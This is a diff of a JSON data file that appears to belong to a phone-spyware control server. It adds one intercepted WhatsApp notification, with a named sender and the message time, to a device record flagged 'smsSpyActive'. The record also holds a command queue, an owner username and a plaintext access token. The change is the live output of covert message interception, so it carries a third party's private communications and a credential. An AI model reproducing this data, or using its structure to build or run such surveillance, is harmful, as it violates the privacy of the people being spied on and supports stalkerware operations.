@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776859055597,
+    "lastSeen": 1776859058606,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -9969,6 +9969,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Senam Rappocini (11 pesan): ~ pati muliati",
+        "content": "💟 Stiker",
+        "time": "22/04 19:57",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776859059645
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
